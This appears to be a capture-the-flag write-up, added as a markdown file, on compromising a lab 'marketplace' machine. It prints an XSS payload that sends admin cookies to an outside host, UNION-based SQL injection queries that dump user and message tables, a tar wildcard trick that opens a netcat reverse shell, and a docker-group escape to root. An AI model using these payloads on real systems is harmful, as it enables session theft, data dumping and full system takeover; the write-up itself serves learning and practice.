@@ -1,0 +1,82 @@
+#cookies
+
+#sqli
+
+#tarexploit
+
+#dockerescape
+
+this one was tough 
+
+basic enumeration, i found JSON cookies and decided to play with them
+
+tampering the data didnt lead to anything, so i had to create a new post and report it to the admins so i would steal the cookie 
+
+nice oneliner for this:
+
+`<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>`
+
+more on this:
+
+[WebHacking101/xss-reflected-steal-cookie.md at master · R0B1NL1N/WebHacking101](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
+
+then, after getting the cookie, on the admin pane there was a parameter that was injectable
+
+the road to discovering hashes and messages that revealed a plaintext passowrd was this:
+
+`/admin?user=0 union select 1,2,3,4`
+
+enumerating no of columns
+
+`/admin?user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata`
+
+enumerating databases
+
+`/admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’marketplace’`
+
+enumerating table names, output was items, users and messages
+
+enumerating and dumping users table:
+
+`/admin?user=0 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema=’users’`
+
+`/admin?user=0 union select 1,group_concat(id,username,password),3,4 from marketplace.users`
+
+enumerating and dumping messages table
+
+`/admin?user=0 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema=’messages’`
+
+`/admin?user=0 union select 1,group_concat(message_content),3,4 from marketplace.messages`
+
+this revealed a plaintext password as one of the messages for ssh, turned out it was user jake 
+
+inside the system, after running `sudo -l` it turned out that jake can run a script with sudo rights as another user michael without providing password
+
+for this, there is a wildcard exploit
+
+[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
+
+commands as follow:
+
+```
+cd /opt/backups/
+ls
+backup.sh  backup.tar
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.3.202 9001 >/tmp/f" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+chmod 777 backup.tar shell.sh
+sudo -u michael /opt/backups/backup.sh
+```
+
+after doing this, we got a shell as michael
+
+michael, as enumeration has shown, was part of docker group (as this was a docker env) 
+
+**important part, docker escape as member of the docker group:**
+
+`docker image ls`
+
+`docker run -v /:/mnt --rm -it alpine chroot /mnt sh` (please make sure that you are using TTY, if theres no TTY present on the shell, please run: `python -c "import pty;pty.spawn('/bin/bash')"`
+
+this got us a root shell
